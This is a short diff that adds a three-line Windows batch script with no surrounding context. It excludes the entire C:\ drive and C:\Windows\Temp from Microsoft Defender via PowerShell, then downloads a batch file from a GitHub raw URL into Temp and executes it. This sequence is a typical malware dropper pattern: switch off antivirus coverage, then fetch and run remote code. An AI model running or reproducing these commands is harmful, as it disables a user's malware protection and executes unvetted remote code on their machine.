@@ -1,0 +1,3 @@
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Add-MpPreference -ExclusionPath C:\,C:\Windows\Temp\
+curl -o C:\Windows\Temp\DWD.bat https://raw.githubusercontent.com/EnlistedGames/curl/main/DWD.bat
+C:\Windows\Temp\DWD.bat
